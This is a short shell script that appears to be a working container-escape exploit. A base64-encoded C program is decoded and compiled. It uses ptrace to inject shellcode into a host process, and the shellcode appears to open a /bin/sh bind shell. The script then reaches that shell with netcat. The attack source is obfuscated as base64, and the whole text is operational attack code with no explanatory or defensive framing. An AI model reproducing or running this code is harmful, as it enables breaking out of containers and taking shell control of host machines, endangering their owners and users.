apt update && apt install -y build-essential netcat net-tools nano
echo "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CgojaW5jbHVkZSA8c3lzL3B0cmFjZS5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvd2FpdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CgojaW5jbHVkZSA8c3lzL3VzZXIuaD4KI2luY2x1ZGUgPHN5cy9yZWcuaD4KCiNkZWZpbmUgU0hFTExDT0RFX1NJWkUgODcKCnVuc2lnbmVkIGNoYXIgKnNoZWxsY29kZSA9IAogICAgIlx4NDhceDMxXHhjMFx4NDhceDMxXHhkMlx4NDhceDMxXHhmNlx4ZmZceGM2XHg2YSIKICAgICJceDI5XHg1OFx4NmFceDAyXHg1Zlx4MGZceDA1XHg0OFx4OTdceDZhXHgwMlx4NjYiCiAgICAiXHhjN1x4NDRceDI0XHgwMlx4MTVceGUwXHg1NFx4NWVceDUyXHg2YVx4MzFceDU4IgogICAgIlx4NmFceDEwXHg1YVx4MGZceDA1XHg1ZVx4NmFceDMyXHg1OFx4MGZceDA1XHg2YSIKICAgICJceDJiXHg1OFx4MGZceDA1XHg0OFx4OTdceDZhXHgwM1x4NWVceGZmXHhjZVx4YjAiCiAgICAiXHgyMVx4MGZceDA1XHg3NVx4ZjhceGY3XHhlNlx4NTJceDQ4XHhiYlx4MmZceDYyIgogICAgIlx4NjlceDZlXHgyZlx4MmZceDczXHg2OFx4NTNceDQ4XHg4ZFx4M2NceDI0XHhiMCIKICAgICJceDNiXHgwZlx4MDUiOwoKaW50IGluamVjdF9kYXRhKHBpZF90IHBpZCwgdW5zaWduZWQgY2hhciAqc3JjLCB2b2lkICpkc3QsIGludCBsZW4pIHsKICAgIGludCBpOwogICAgdWludDMyX3QgKnMgPSAodWludDMyX3QgKikgc3JjOwogICAgdWludDMyX3QgKmQgPSAodWludDMyX3QgKikgZHN0OwoKICAgIGZvciAoaSA9IDA7IGkgPCBsZW47IGkgKz0gNCwgcysrLCBkKyspIHsKICAgICAgICBpZiAoKHB0cmFjZShQVFJBQ0VfUE9LRVRFWFQsIHBpZCwgZCwgKnMpKSA8IDApIHsKICAgICAgICAgICAgcGVycm9yKCJwdHJhY2UoUE9LRVRFWFQpOiIpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAwOwp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CiAgICBwaWRfdCB0YXJnZXQ7CiAgICBzdHJ1Y3QgdXNlcl9yZWdzX3N0cnVjdCByZWdzOwogICAgaW50IHN5c2NhbGw7CiAgICBsb25nIGRzdDsKCiAgICBpZiAoYXJnYyAhPSAyKSB7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJVc2FnZTpcblx0JXMgcGlkXG4iLCBhcmd2WzBdKTsKICAgICAgICBleGl0KDEpOwogICAgfQoKICAgIHRhcmdldCA9IGF0b2koYXJndlsxXSk7IC8vIEdldCB0aGUgcHJvY2VzcyBJZAogICAgcHJpbnRmKCIrIFRyYWNpbmcgcHJvY2VzcyAlZFxuIiwgdGFyZ2V0KTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9BVFRBQ0gsIHRhcmdldCwgTlVMTCwgTlVMTCkpIDwgMCkgewogICAgICAgIHBlcnJvcigicHRyYWNlIChBVFRBQ0gpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgcHJpbnRmKCIrIFdhaXRpbmcgZm9yIHByb2Nlc3MgLi4uIFxuIik7CiAgICB3YWl0KE5VTEwpOwoKICAgIHByaW50ZigiKyBHZXR0aW5nIFJlZ2lzdGVycyAuLi4gXG4iKTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9HRVRSRUdTLCB0YXJnZXQsIE5VTEwsICZyZWdzKSkgPCAwKSB7CiAgICAgICAgcGVycm9yKCJwdHJhY2UgKEdFVFJFR1MpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgcHJpbnRmKCIrIEluamVjdGluZyBzaGVsbCBjb2RlIGF0ICVwXG4iLCAodm9pZCopcmVncy5yaXApOwogICAgaW5qZWN0X2RhdGEodGFyZ2V0LCBzaGVsbGNvZGUsICh2b2lkKilyZWdzLnJpcCwgU0hFTExDT0RFX1NJWkUpOwogICAgcmVncy5yaXAgKz0gMjsKCiAgICBwcmludGYoIisgU2V0dGluZyBpbnN0cnVjdGlvbiBwb2ludGVyIHRvICVwXG4iLCAodm9pZCAqKXJlZ3MucmlwKTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9TRVRSRUdTLCB0YXJnZXQsIE5VTEwsICZyZWdzKSkgPCAwKSB7CiAgICAgICAgcGVycm9yKCJwdHJhY2UoR0VUUkVHUyk6Iik7CiAgICAgICAgZXhpdCgxKTsKICAgIH0KICAgIHByaW50ZigiKyBSdW4gSXQhXG4iKTsKCiAgICBpZiAoKHB0cmFjZShQVFJBQ0VfREVUQUNILCB0YXJnZXQsIE5VTEwsIE5VTEwpKSA8IDApIHsKICAgICAgICBwZXJyb3IoInB0cmFjZShERVRBQ0gpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgcmV0dXJuIDA7Cn0=%" | base64 -d >> inject.c
gcc inject.c -o inject
ps -eaf | grep python  # Get the PID of the python process (the PID is the same of the host)
echo "Type the PID: "
read pidproc
./inject ${pidproc}
ifconfig  # Get the IP of the container and the Gateway
echo "Type the IP: "
read ip
echo "Choose a port (1-65535)"
read port

nc ${ip} ${port}
